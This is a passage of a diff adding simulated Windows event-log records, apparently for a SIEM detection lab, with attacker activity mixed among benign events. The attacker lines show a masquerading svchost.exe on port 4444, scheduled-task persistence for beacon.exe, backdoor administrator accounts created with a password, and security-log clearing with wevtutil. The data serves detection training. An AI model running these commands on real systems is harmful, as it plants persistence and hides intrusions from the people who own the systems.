+    "CommandLine": "Get-Process | Where-Object { \\2.CPU -gt 10 } | Select-Object Name, CPU"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:07:27.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "John.Smith",
+    "ProcessName": "svchost.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "C:\\Users\\Public\\Downloads\\svchost.exe --port 4444"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:07:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "John.Smith",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:07:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Emily.Davis",
+    "LogonType": 3,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:08:02.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\CriticalUpdate\\UpdateAgent_4",
+    "TaskPath": "C:\\Windows\\Temp\\beacon.exe",
+    "CommandLine": "schtasks /create /tn CriticalUpdate /tr C:\\Windows\\Temp\\beacon.exe /sc hourly"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:08:07.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:08:22.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Sarah.Jenkins",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4732,
+    "Category": "Account",
+    "TimeGenerated": "2026-06-01T08:08:37.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "SYSTEM",
+    "TargetAccount": "backdoor_admin_3",
+    "TargetGroup": "Administrators",
+    "CommandLine": "net localgroup administrators backdoor_admin_3 /add"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:08:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "James.Doe",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Write-Output 'System Health Check Completed Successfully.'; exit 0"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:08:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Inioluwa",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:09:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "John.Smith",
+    "LogonType": 11,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4720,
+    "Category": "Account",
+    "TimeGenerated": "2026-06-01T08:09:12.7537389+01:00",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "SYSTEM",
+    "TargetAccount": "backdoor_admin_2",
+    "CommandLine": "net user backdoor_admin_2 TargetPass123! /add"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:09:22.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:09:37.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "David.Miller",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:09:47.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Administrator",
+    "ProcessName": "wevtutil.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "wevtutil.exe cl Security"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:09:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties DisplayName"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:10:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "James.Doe",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  }
+]
